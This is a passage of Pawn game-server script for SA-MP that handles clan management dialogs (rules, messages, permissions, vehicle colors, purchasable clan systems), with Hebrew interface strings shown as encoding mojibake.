							case 2: /* map */ ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "счщ°· ющўхэ у°ъ фюЇф",@c(green) ":∙щэ ьс" @c(yellow) "\n\n.хьёюя сюЇф р· фющўхэ ∙р·ф юЄхЁщщя ьсчх° Map хрц Escape Єьщъ ььчхї\n.N ыущ ьр ь∙Ёх· ющўхэ, ьчї","OK","");
							case 3: /* fly */
							{
								playerinfo[playerid][flytype] = fmt_clan;
								ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "счщ°· ющўхэ у°ъ ·ЄхЇф",@c(green) ":∙щэ ьс" @c(yellow) "\n\n.Y Єьщъ ьЄхє сЄц°· фчЎщэ хфЄыс° ьющўхэ ∙р·ф юЄхЁщщя ьсчх° хрц ььчхї Єь юў∙\n.N ыущ ьр ь∙Ёх· ющўхэ, ьчї","OK","");
								StartFlyMode(playerid,claninfo[playerinfo[playerid][clan]][chq][0],claninfo[playerinfo[playerid][clan]][chq][1],claninfo[playerinfo[playerid][clan]][chq][2]);
							}
						}
					}
					case clan_editcmd:
					{
						if(!HasClanPermission(playerid,clanperm_edit)) return 1;
						if(!strlen(inputtext)) return ClanDialog(playerid,clan_err,".ьр фўьу· Їўхуф");
						if(strlen(inputtext) > 30) return ClanDialog(playerid,clan_err,".рх°ъ фЇўхуф фюўёщюьщ фхр 30 ·хщэ");
						for(new i = 0, j = strlen(inputtext); i < j; i++) if((inputtext[i] < 'a' || inputtext[i] > 'z') && (inputtext[i] < 'A' || inputtext[i] > 'Z')) return ClanDialog(playerid,clan_err,".фЇўхуф ∙фхўьуф рщЁф ·ўщЁф");
						format(claninfo[playerinfo[playerid][clan]][ccmd],32,inputtext);
						format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
						fsetstring(string,"Command",claninfo[playerinfo[playerid][clan]][ccmd]);
						format(string,sizeof(string),@c(green) ":Є°ы· сфЎьчф р· фЇўхуф ьф∙·т°х· ьюЇўуф ь\n" @c(yellow) "/%s",inputtext);
						ClanDialog(playerid,clan_not,string,clan_edit);
						format(string,sizeof(string)," * /%s :∙щЁф р· фЇўхуф ь∙щтх° ьюЇўуф ь %s",inputtext);
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_editgangzone:
					{
						if(!HasClanPermission(playerid,clanperm_gzone)) return 1;
						if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ыущ ьсЎЄ ЇЄхьф цх, ьўьря ∙ьъ Ў°щыф ьфщх· юЇўуф");
						new s = listitem + 1;
						claninfo[playerinfo[playerid][clan]][cgzonesize] = s;
						fsetint(f,"GangZoneSize",s);
						UpdateClanGangZone(playerinfo[playerid][clan]);
						format(string,sizeof(string),@c(green) ".Є°ы· сфЎьчф р· тхуь рцх° фўьря ь-%d",s);
						ClanDialog(playerid,clan_not,string,clan_edit);
						format(string,sizeof(string)," * ∙щЁф р· тхуь рцх° фўьря сюЇф ь-%d %s",s,GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_manage:
					{
						switch(listitem)
						{
							case 0: // tests
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								claninfo[playerinfo[playerid][clan]][ctest] = _:(!(bool:claninfo[playerinfo[playerid][clan]][ctest]));
								fsetint(f,"Test",claninfo[playerinfo[playerid][clan]][ctest]);
								if(!claninfo[playerinfo[playerid][clan]][ctest]) for(new i = 0; i < sizeof(Signboards); i++) if(Signboards[i][sbUpdateType] == sbu_clans) if(Signboards[i][sbObject] != -1)
								{
									new tmp, tmps[64];
									GetDynamicObjectMaterialText(Signboards[i][sbObject],0,string,tmp,tmps,tmp,tmp,tmp,tmp,tmp,sizeof(string),sizeof(tmps));
									#pragma unused tmp
									#pragma unused tmps
									if(strfind(string,claninfo[playerinfo[playerid][clan]][cname]) != -1) UpdateSignboards("clans");
								}
								format(string,sizeof(string),@c(green) "%s\n/Clans :юЎс фўьря юсчщЁ· шёшщэ юхЇщЄ сЇўхуф",claninfo[playerinfo[playerid][clan]][ctest] ? (".фўьря ЁЇ·ч ьшёшщэ") : (".фўьря Ёёт° ьшёшщэ"));
								ClanDialog(playerid,clan_not,string,clan_manage);
								format(string,sizeof(string)," * ўсЄ ∙фўьря %s ьшёшщэ %s",claninfo[playerinfo[playerid][clan]][ctest] ? ("Ї·хч") : ("ётх°"),GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 1: // color
							{
								if(!HasClanPermission(playerid,clanperm_coloredit)) return 1;
								ClanDialog(playerid,clan_editcolor);
							}
							case 2: // message
							{
								ClanDialog(playerid,clan_message);
							}
							case 3: // rules
							{
								ClanDialog(playerid,clan_rules);
							}
							case 4: // signs
							{
								ClanDialog(playerid,clan_signs);
							}
							case 5: // permissions
							{
								ClanDialog(playerid,clan_perms);
							}
						}
					}
					case clan_editcolor:
					{
						if(!HasClanPermission(playerid,clanperm_coloredit)) return 1;
						new theColor = GetColorFromClanDialog(playerid,inputtext,clan_editcolor);
						assert theColor != 0;
						fsetint(f,"R",claninfo[playerinfo[playerid][clan]][ccolor][0] = getRed(theColor));
						fsetint(f,"G",claninfo[playerinfo[playerid][clan]][ccolor][1] = getGreen(theColor));
						fsetint(f,"B",claninfo[playerinfo[playerid][clan]][ccolor][2] = getBlue(theColor));
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) SetPlayerColor(claninfo[playerinfo[playerid][clan]][cplayers][i],rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],PLAYER_ALPHA));
						UpdateClanGangZone(playerinfo[playerid][clan]);
						if(claninfo[playerinfo[playerid][clan]][hashq])
						{
							format(string,sizeof(string),"{%s}%s",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname]);
							for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cvehicles]; i++) SetVehicleNumberPlate(claninfo[playerinfo[playerid][clan]][cvehicle][i],string);
						}
						format(string,sizeof(string),"{%s}.∙щЁщ· р· ЎсЄ фўьря ьЎсЄ ффхуЄф фцх. ·хыь ь°рх· ухтюф сЎ'рш",ClanHexColor(playerinfo[playerid][clan]));
						ClanDialog(playerid,clan_not,string,clan_manage);
						format(string,sizeof(string),"%s" @c(white) ": фхуЄ· сущўф [ID: %03d | !фхуЄ· Ёёщхя]",ClanHexColor(playerinfo[playerid][clan]),GetName(playerid),playerid);
						SendClientMessage(playerid,GetPlayerColor(playerid),string);
						format(string,sizeof(string)," * ∙щЁф р· ЎсЄ фўьря %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_message:
					{
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_not,@c(white) ".фхуЄ· фўьря фщр фхуЄф ∙юхЇщЄф ьыь чс° ўьря ы∙фхр ЁыЁё ь∙°·\n,Ёщ·я ь°∙хэ сф фхуЄх· ч∙хсх·, щ∙щсх· ўьря, ЄуыхЁщэ хЄху\n.хфэ щхЇщЄх ьыь чс°щ фўьря",clan_message);
							case 1: // view
							{
								if(strlen(claninfo[playerinfo[playerid][clan]][cmessage]) <= 1) return ClanDialog(playerid,clan_err,".рщя фхуЄ· ўьря");
								ClanDialog(playerid,clan_not,@c(green) ".фхуЄ· фўьря юхЇщЄф ы°тЄ сЎ'рш",clan_message);
								format(string,sizeof(string)," ╗ Clan Message: %s",claninfo[playerinfo[playerid][clan]][cmessage]);
								SendClientMessage(playerid,purple,string);
							}
							case 2: // edit
							{
								if(!HasClanPermission(playerid,clanperm_message)) return 1;
								ClanDialog(playerid,clan_messageedit);
							}
							case 3: // delete
							{
								if(!HasClanPermission(playerid,clanperm_message)) return 1;
								if(strlen(claninfo[playerinfo[playerid][clan]][cmessage]) <= 1) return ClanDialog(playerid,clan_err," .рщя фхуЄ· ўьря");
								claninfo[playerinfo[playerid][clan]][cmessage][0] = 'x', claninfo[playerinfo[playerid][clan]][cmessage][1] = 0;
								fsetstring(f,"Message","x");
								ClanDialog(playerid,clan_not,@c(green) ".ючў· сфЎьчф р· фхуЄ· фўьря",clan_message);
								format(string,sizeof(string)," * ючў р· фхуЄ· фўьря %s",GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 4: // show all
							{
								if(!HasClanPermission(playerid,clanperm_message)) return 1;
								if(strlen(claninfo[playerinfo[playerid][clan]][cmessage]) <= 1) return ClanDialog(playerid,clan_err," .рщя фхуЄ· ўьря");
								format(string,sizeof(string)," :юЎщт р· фхуЄ· фўьря ьыь чс°щ фўьря %s",GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								format(string,sizeof(string)," ╗ Clan Message: %s",claninfo[playerinfo[playerid][clan]][cmessage]);
								for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],purple,string);
								ClanDialog(playerid,clan_message);
							}
						}
					}
					case clan_messageedit:
					{
						if(!HasClanPermission(playerid,clanperm_message)) return 1;
						if(strlen(inputtext) < 2) return ClanDialog(playerid,clan_err,".ффхуЄф ўЎ°ф юущ, ющЁщюхэ 2 ·хщэ");
						if(strlen(inputtext) > 80) return ClanDialog(playerid,clan_err,".ффхуЄф р°хыф юущ, юўёщюхэ 80 ·хщэ");
						format(claninfo[playerinfo[playerid][clan]][cmessage],128,inputtext);
						fsetstring(f,"Message",inputtext);
						format(string,sizeof(string)," :∙щЁф р· фхуЄ· фўьря %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						format(string,sizeof(string)," ╗ New Clan Message: %s",inputtext);
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],purple,string);
						format(string,sizeof(string),@c(green) ":Є°ы· сфЎьчф р· фхуЄ· фўьря ьфхуЄф фсрф\n" @c(white) "%s",inputtext);
						ClanDialog(playerid,clan_not,string,clan_message);
						PlaySound(playerid,1057);
					}
					case clan_rules:
					{
						new dia[1024];
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_not,@c(white) ",чхўщ фўьря фэ °∙щюф ∙ь чхўщэ ∙фьщу° щыхь ьЄ°хъ\n.с°тЄ ∙∙чўя Ё°∙э ьўьря юхЇщЄф ьх °∙щю· фчхўщэ",clan_rules);
							case 1: // view
							{
								new rules = 0;
								for(new i = 0; i < sizeof(crules[]); i++)
								{
									if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
									format(dia,sizeof(dia),"%s\n Х %02d. %s",dia,i+1,crules[playerinfo[playerid][clan]][i]);
									rules++;
								}
								if(!rules) format(dia,sizeof(dia),@c(red) ".ьр фхту°х чхўщ ўьря");
								else format(dia,sizeof(dia),":чхўщ фўьря\n%s",dia);
								ClanDialog(playerid,clan_not,dia,clan_rules);
							}
							case 2: // edit
							{
								if(!HasClanPermission(playerid,clanperm_rules)) return 1;
								ClanDialog(playerid,clan_rulesedit);
							}
							case 3: // delete
							{
								if(!HasClanPermission(playerid,clanperm_rules)) return 1;
								ClanDialog(playerid,clan_rulesreset);
							}
							case 4: // show all
							{
								if(!HasClanPermission(playerid,clanperm_rules)) return 1;
								new rules = 0;
								for(new i = 0; i < sizeof(crules[]); i++)
								{
									if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
									format(dia,sizeof(dia),"%s\n Х %02d. %s",dia,i+1,crules[playerinfo[playerid][clan]][i]);
									rules++;
								}
								if(!rules) format(dia,sizeof(dia),@c(red) ".ьр фхту°х чхўщ ўьря");
								else format(dia,sizeof(dia),":чхўщ фўьря\n%s",dia);
								for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) ClanDialog(claninfo[playerinfo[playerid][clan]][cplayers][i],clan_not,dia,clan_rules);
							}
						}
					}
					case clan_rulesedit:
					{
						if(!HasClanPermission(playerid,clanperm_rules)) return 1;
						playerinfo[playerid][clickon] = listitem;
						ClanDialog(playerid,clan_ruleinput,inputtext,listitem);
					}
					case clan_rulesreset:
					{
						if(!HasClanPermission(playerid,clanperm_rules)) return 1;
						new rules = 0;
						for(new i = 0; i < sizeof(crules[]); i++)
						{
							if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
							crules[playerinfo[playerid][clan]][i] = "x", rules++;
							format(string,sizeof(string),"Rule%d",i+1);
							fremovekey(f,string);
						}
						ClanDialog(playerid,clan_not,@c(green) ".ыь фчхўщэ Ёючўх",clan_rules);
						format(string,sizeof(string)," * ючў р· ыь чхўщ фўьря %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_ruleinput:
					{
						if(!HasClanPermission(playerid,clanperm_rules)) return 1;
						if(strlen(inputtext) > 100) return ClanDialog(playerid,clan_not,@c(red) ".фчхў р°хъ юущ, юўёщюхэ 100 ·хщэ",clan_rulesedit);
						format(string,sizeof(string),"Rule%d",playerinfo[playerid][clickon]+1);
						if(strlen(inputtext) <= 1)
						{
							if(fkeyexist(f,string)) fremovekey(f,string);
							format(string,sizeof(string),@c(green) ":ючў· сфЎьчф р· чхў юёЇ° %02d ∙фщф\n%s",playerinfo[playerid][clickon]+1,crules[playerinfo[playerid][clan]][playerinfo[playerid][clickon]]);
							ClanDialog(playerid,clan_not,string,clan_rulesedit);
							format(string,sizeof(string)," * :ючў р· чхў юёЇ° %02d ∙фщф %s",playerinfo[playerid][clickon]+1,GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
							ClanNotification(playerinfo[playerid][clan],crules[playerinfo[playerid][clan]][playerinfo[playerid][clickon]]);
							crules[playerinfo[playerid][clan]][playerinfo[playerid][clickon]] = "x";
						}
						else
						{
							format(crules[playerinfo[playerid][clan]][playerinfo[playerid][clickon]],sizeof(crules[][]),inputtext);
							fsetstring(f,string,inputtext);
							format(string,sizeof(string),@c(green) ":Є°ы· сфЎьчф р· чхў юёЇ° %02d ьшўёш фср\n%s",playerinfo[playerid][clickon]+1,inputtext);
							ClanDialog(playerid,clan_not,string,clan_rulesedit);
							format(string,sizeof(string)," * :Є°ъ р· чхў юёЇ° %02d ьчхў фср %s",playerinfo[playerid][clickon]+1, GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
							ClanNotification(playerinfo[playerid][clan],inputtext);
						}
						PlaySound(playerid,1057);
					}
					case clan_signs:
					{
						if(!listitem) ClanDialog(playerid,clan_not,@c(white) ",рх·х· фўьря, рх ёщюЁщ фўьря, юрЇ∙°щэ ьъ ь°∙хэ Їўхух· юрху ўЎ°х·\n.∙щЇ°ёюх фхуЄф ьсчщ°·ъ сЎ'рш °ў ьчс°щ фўьря\n!юхюьї ьф∙·ю∙ сёщюЁщэ рьх Єь юЁ· ь°∙хэ фхуЄх· Єь Їьщ∙ф ьюЇўуф хсў∙х· учхЇх·",clan_signs);
						else
						{
							if(!HasClanPermission(playerid,clanperm_signs)) return 1;
							playerinfo[playerid][clickon] = listitem;
							ClanDialog(playerid,clan_signinput,inputtext,listitem);
						}
					}
					case clan_signinput:
					{
						if(!HasClanPermission(playerid,clanperm_signs)) return 1;
						if(strlen(inputtext) > 100) return ClanDialog(playerid,clan_not,@c(red) ".фрх· р°хыф юущ, юўёщюхэ 100 ·хщэ",clan_signinput);
						format(string,sizeof(string),"Sign%d",playerinfo[playerid][clickon]);
						if(strlen(inputtext) <= 1)
						{
							fremovekey(f,string);
							format(string,sizeof(string),@c(green) ":ючў· сфЎьчф р· рх· юёЇ° %d ∙фщщ·ф\n%s",playerinfo[playerid][clickon],csigns[playerinfo[playerid][clan]][playerinfo[playerid][clickon]-1]);
							ClanDialog(playerid,clan_not,string,clan_signs);
							format(string,sizeof(string)," * :ючў р· рх· юёЇ° %d ∙фщщ·ф %s",playerinfo[playerid][clickon],GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
							ClanNotification(playerinfo[playerid][clan],csigns[playerinfo[playerid][clan]][playerinfo[playerid][clickon]-1]);
							csigns[playerinfo[playerid][clan]][playerinfo[playerid][clickon]-1] = "x";
						}
						else
						{
							format(csigns[playerinfo[playerid][clan]][playerinfo[playerid][clickon]-1],sizeof(csigns[][]),inputtext);
							fsetstring(f,string,inputtext);
							format(string,sizeof(string),@c(green) ":Є°ы· сфЎьчф р· рх· юёЇ° %d ьшўёш фср\n%s",playerinfo[playerid][clickon],inputtext);
							ClanDialog(playerid,clan_not,string,clan_signs);
							format(string,sizeof(string)," * :Є°ъ р· рх· юёЇ° %d ьрх· фсрф %s",playerinfo[playerid][clickon],GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
							ClanNotification(playerinfo[playerid][clan],inputtext);
						}
						PlaySound(playerid,1057);
					}
					case clan_perms:
					{
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_not,@c(white) ".ыюх ∙щухЄ, ьыь чс° сўьря щ∙ \"°ю· тщ∙х·\" ∙фщр сЄЎэ °ю· фыхч ∙ьх ьсЎЄ ЇЄхьх· ∙хЁх· ∙ў∙х°х· ьўьря\n.сЄц°· фф°∙рх·, Ёщ·я ьфтсщь ЇЄхьх· юёхщщюх· °ў ь°юф ф°Ўхщф\n!ьухтюф - Ёщ·я ьсчх° ∙°ў ю°ю· тщ∙х· 4 щфщф Ёщ·я ьЎ°є ∙чўЁщэ ьўьря",clan_perms);
							case 1: // view
							{
								ClanDialog(playerid, clan_permsview_total);
							}
							case 2: // edit
							{
								if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єьщъ ьфщх· с°ю· тщ∙х· 5 Єь юЁ· ьЄ°хъ р· фф°∙рх·",clan_perms);
								ClanDialog(playerid,clan_permsedit);
							}
							case 3: // set to defaults
							{
								if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єьщъ ьфщх· с°ю· тщ∙х· 5 Єь юЁ· ьЄ°хъ р· фф°∙рх·",clan_perms);
								ClanDialog(playerid,clan_permsdefaults);
							}
						}
					}
					case clan_permsview:
					{
						new list[1500];
						for(new i = 0; i < sizeof(ClanPermissions); i++) if(claninfo[playerinfo[playerid][clan]][cperms][i] >= (listitem+1)) format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х [%d] %s") : ("%s\r\n {%s}Х [%d] %s"),list,HexStringOfColor(orange),claninfo[playerinfo[playerid][clan]][cperms][i],ClanPermissions[i][clpName]);
						ClanDialog(playerid,clan_permsview,list);
					}
					case clan_permsedit:
					{
						if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єьщъ ьфщх· с°ю· тщ∙х· 5 Єь юЁ· ьЄ°хъ р· фф°∙рх·",clan_perms);
						ClanDialog(playerid,clan_permselect,.paramint = (playerinfo[playerid][clickon] = listitem));
					}
					case clan_permselect:
					{
						if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єьщъ ьфщх· с°ю· тщ∙х· 5 Єь юЁ· ьЄ°хъ р· фф°∙рх·",clan_perms);
						new lvl = listitem < 5 ? (listitem + 1) : ClanPermissions[playerinfo[playerid][clickon]][clpDefault];
						//if(listitem >= 5) ClanDialog(playerid,clan_permselect, .paramint = listitem);
						claninfo[playerinfo[playerid][clan]][cperms][playerinfo[playerid][clickon]] = lvl;
						format(string,sizeof(string),"Permission%d",ClanPermissions[playerinfo[playerid][clickon]][clpUniqueID]);
						fsetint(f,string,lvl);
						ClanDialog(playerid,clan_permselect, .paramint = playerinfo[playerid][clickon]);
						PlaySound(playerid,1057);
					}
					case clan_permsdefaults:
					{
						if(playerinfo[playerid][lclan] < 5) return ClanDialog(playerid,clan_err,".Єьщъ ьфщх· с°ю· тщ∙х· 5 Єь юЁ· ьЄ°хъ р· фф°∙рх·",clan_perms);
						for(new i = 0; i < sizeof(ClanPermissions); i++)
						{
							format(string,sizeof(string),"Permission%d",ClanPermissions[playerinfo[playerid][clickon]][clpUniqueID]);
							fsetint(f,string,ClanPermissions[i][clpDefault]);
							claninfo[playerinfo[playerid][clan]][cperms][i] = ClanPermissions[i][clpDefault];
						}
						ClanDialog(playerid,clan_not,@c(green) ".фф°∙рх· ∙хчц°х сфЎьчф ьс°щ°· фючуь",clan_perms);
						PlaySound(playerid,1057);
					}
					case clan_systems:
					{
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_buysystems);
							case 1: ClanDialog(playerid,clan_not,@c(white) ".юЄ°ых· фўьря фя рЇ∙°хщх· ющхчух· ь∙щЇх° фюЇўуф хфўьря\n.Ёщ·я ьўЁх· рх·я сючщ°щэ тсхфщэ, ръ фючщ° ю∙·ьэ ыщ фюЄ°ых· щЄщьх· юрху ьўьря\n\n" @c(red) "!∙щэ ьс: рэ ўьря Ёючў ьр щфщф фчц° Єь фюЄ°ых· ∙ьх ∙щючўх щчу рщ·х",clan_systems);
							default:
							{
							    if(!claninfo[playerinfo[playerid][clan]][csystems][listitem - 2]) return ClanDialog(playerid, clan_err, "юЄ°ы· цх ьр Ё°ы∙ф");
								new bool:justToggle = false, cmd[16], sysname[64];
								switch(listitem-2)
								{
									case clansys_tk:
									{
										ToggleClanTeamKill(playerinfo[playerid][clan],playerid);
										format(string,sizeof(string),@c(green) ".%s р· юЄ°ы· фрЁшщ шщэ ўщь",claninfo[playerinfo[playerid][clan]][csystemparam][clansys_tk] ? ("фЇЄь·") : ("ыщсщ·"));
										ClanDialog(playerid,clan_not,string,clan_systems);
									}
									case clansys_alert: justToggle = true, cmd = "/alert", sysname = "юЄ°ы· фрцЄўх· ∙ь фюЇўуф";
									case clansys_lockveh: justToggle = true, cmd = "", sysname = "юЄ°ы· ЁЄщь· ф°ысщэ";
									case clansys_lockpick: justToggle = true, cmd = "", sysname = "юЄ°ы· ЁЄщь· фЇщўрЇщэ";
									case clansys_controlv: ClanDialog(playerid,clan_vcontrol);
									case clansys_controlhq: ClanDialog(playerid,clan_hqcontrol);
									case clansys_security: justToggle = true, cmd = "", sysname = "юЄ°ы· фрсшчф ∙ь фюЇўуф";
								}
								if(justToggle)
								{
									claninfo[playerinfo[playerid][clan]][csystemparam][listitem-2] = !claninfo[playerinfo[playerid][clan]][csystemparam][listitem-2];
									format(string,sizeof(string),"System%dParam",ClanSystems[listitem-2][clsUniqueID]);
									fsetint(f,string,claninfo[playerinfo[playerid][clan]][csystemparam][listitem-2]);
									format(string,sizeof(string),@c(green) ".%s р· %s",claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert] ? ("фЇЄь·") : ("ыщсщ·"),sysname);
									ClanDialog(playerid,clan_not,string,clan_systems);
									if(strlen(cmd) > 0) format(string,sizeof(string)," * [%s] %s р· %s %s",cmd,claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert] ? ("фЇЄщь") : ("ыщсф"),sysname,GetName(playerid));
									else format(string,sizeof(string)," * %s р· %s %s",claninfo[playerinfo[playerid][clan]][csystemparam][clansys_alert] ? ("фЇЄщь") : ("ыщсф"),sysname,GetName(playerid));
									ClanNotification(playerinfo[playerid][clan],string);
								}
							}
						}
					}
					case clan_buysystems:
					{
						playerinfo[playerid][clickon] = listitem;
						ClanDialog(playerid,clan_buysystem);
					}
					case clan_buysystem:
					{
						new s = playerinfo[playerid][clickon];
						if(claninfo[playerinfo[playerid][clan]][csystems][s]) ClanDialog(playerid,clan_buysystems);
						else
						{
							if(!HasClanPermission(playerid,clanperm_upgrade)) return 1;
							if(GetMoney(playerid) < ClanSystems[s][clsCost]) return ClanDialog(playerid,clan_err,".рщя ьъ юёЇщў ыёє ьўЁщщ· фюЄ°ы· фцх",clan_buysystems);
							GiveMoney(playerid,0-ClanSystems[s][clsCost]);
							claninfo[playerinfo[playerid][clan]][csystems][s] = true, claninfo[playerinfo[playerid][clan]][csystemparam][s] = ClanSystems[s][clsParam];
							format(string,sizeof(string),"System%d",ClanSystems[s][clsUniqueID]);
							fsetint(f,string,1);
							if(ClanSystems[s][clsParam] != -1)
							{
								format(string,sizeof(string),"System%dParam",ClanSystems[s][clsUniqueID]);
								fsetint(f,string,ClanSystems[s][clsParam]);
							}
							format(string,sizeof(string),@c(green) "!%s Єсх° фўьря %s ўЁщ· сфЎьчф с-$%d р· фюЄ°ы·",claninfo[playerinfo[playerid][clan]][cname],ClanSystems[s][clsName],ClanSystems[s][clsCost]);
							ClanDialog(playerid,clan_not,string,clan_systems);
							format(string,sizeof(string)," * !с-$%d %s ўЁф ьўьря юЄ°ы· %s",ClanSystems[s][clsCost],ClanSystems[s][clsName],GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
						}
					}
					case clan_vcontrol:
					{
						if(!HasClanPermission(playerid,clanperm_vcontrol)) return 1;
						if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф",clan_vcontrol);
						if(!claninfo[playerinfo[playerid][clan]][cvehicles]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя °ысщэ сюЇўуф",clan_vcontrol);
						switch(listitem)
						{
							case 0: // respawn vehicles
							{
								for(new i = 0, c = playerinfo[playerid][clan]; i < claninfo[c][cvehicles]; i++) if(vehicleinfo[claninfo[c][cvehicle][i]][vvalid] && !vehicleinfo[claninfo[c][cvehicle][i]][playersin])
								{
									SetVehicleToRespawn(claninfo[c][cvehicle][i]);
									LinkVehicleToInterior(claninfo[c][cvehicle][i],0);
									SetVehicleVirtualWorld(claninfo[c][cvehicle][i],world_normal);
									ChangeVehicleColor(claninfo[c][cvehicle][i],vehicleinfo[claninfo[c][cvehicle][i]][newvcol][0],vehicleinfo[claninfo[c][cvehicle][i]][newvcol][1]);
								}
								ClanDialog(playerid,clan_not,@c(green) ".схЎЄ °щёш ьыь °ысщ фўьря",clan_vcontrol);
								format(string,sizeof(string)," * фЇЄщь °щёш ь°ысщ фюЇўуф %s",GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
							}
							case 1: // change colors
							{
								ClanDialog(playerid,clan_vcolor);
							}
							case 2: // save colors
							{
								ClanDialog(playerid,clan_savevcolors);
							}
						}
					}
					case clan_vcolor:
					{
						if(!HasClanPermission(playerid,clanperm_vcontrol)) return 1;
						if(charcount(inputtext,' ') != 1 || strlen(inputtext) < 3 || strlen(inputtext) > 7) return ClanDialog(playerid,clan_err,".ьр °∙ю· Ёыхя р· фЎсЄщэ");
						new sep = strfind(inputtext," "), n[2];
						if(sep == 0 || sep == strlen(inputtext)-1) return ClanDialog(playerid,clan_err,".ьр °∙ю· Ёыхя р· фЎсЄщэ");
						for(new i = 0; i < 2; i++)
						{
							strmid(string,inputtext,!i ? 0 : (sep+1),!i ? sep : strlen(inputtext));
							if(!IsNumeric(string)) return ClanDialog(playerid,clan_err,".ьр °∙ю· Ёыхя р· фЎсЄщэ");
							else n[i] = strval(string);
						}
						if(n[0] < -1 || n[0] > 126 || n[1] < -1 || n[1] > 126) return ClanDialog(playerid,clan_err,".юёЇ°щ фЎсЄщэ рщЁэ ·ўщЁщэ");
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cvehicles]; i++)
						{
							ChangeVehicleColor(claninfo[playerinfo[playerid][clan]][cvehicle][i],n[0],n[1]);
							vehicleinfo[claninfo[playerinfo[playerid][clan]][cvehicle][i]][newvcol][0] = n[0], vehicleinfo[claninfo[playerinfo[playerid][clan]][cvehicle][i]][newvcol][1] = n[1];
						}
						PlaySound(playerid,1134);
						format(string,sizeof(string)," * ∙щЁф р· ЎсЄщ ф°ысщэ сюЇўуф ь %d + %d %s",n[0],n[1],GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						ClanDialog(playerid,clan_vcolor,.paramint=1);
					}
					case clan_savevcolors:
					{
						if(!HasClanPermission(playerid,clanperm_vcontrol)) return 1;
						for(new i = 0, k[16], v = 0; i < claninfo[playerinfo[playerid][clan]][cvehicles]; i++)
						{
							format(k,sizeof(k),"Vehicle%d",i);
							v = claninfo[playerinfo[playerid][clan]][cvehicle][i];
							format(string,sizeof(string),"%d,%.4f,%.4f,%.4f,%.4f,%d,%d",vehicleinfo[v][vemodel],vehicleinfo[v][vspawnpos][0],vehicleinfo[v][vspawnpos][1],vehicleinfo[v][vspawnpos][2],vehicleinfo[v][vspawnpos][3],vehicleinfo[v][newvcol][0],vehicleinfo[v][newvcol][1]);
							fsetstring(f,k,string);
						}
						ClanDialog(playerid,clan_not,@c(green) ".∙ю°· р· ЎсЄщ ф°ысщэ сюЇўуф срхЇя ёхЇщ",clan_vcontrol);
						format(string,sizeof(string)," * ∙ю° р· ЎсЄщ °ысщ фюЇўуф фЁхычщщэ %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
					}
					case clan_hqcontrol:
					{
						if(!HasClanPermission(playerid,clanperm_hqcontrol)) return 1;
						if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф",clan_hqcontrol);
						if(!claninfo[playerinfo[playerid][clan]][cobjects]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя рхсщщўшщэ сюЇўуф хьыя ьр Ёщ·я ьф∙·ю∙ сюЄ°ы· цх",clan_hqcontrol);
						switch(listitem)
						{
							/*case 0: // objects effect
							{
								ClanDialog(playerid,clan_effects);
							}*/
							case 0: // setting speed
							{
								ClanDialog(playerid,clan_settingspeed);
							}
							case 1: // add material
							{
								ClanDialog(playerid,clan_usematerial);
							}
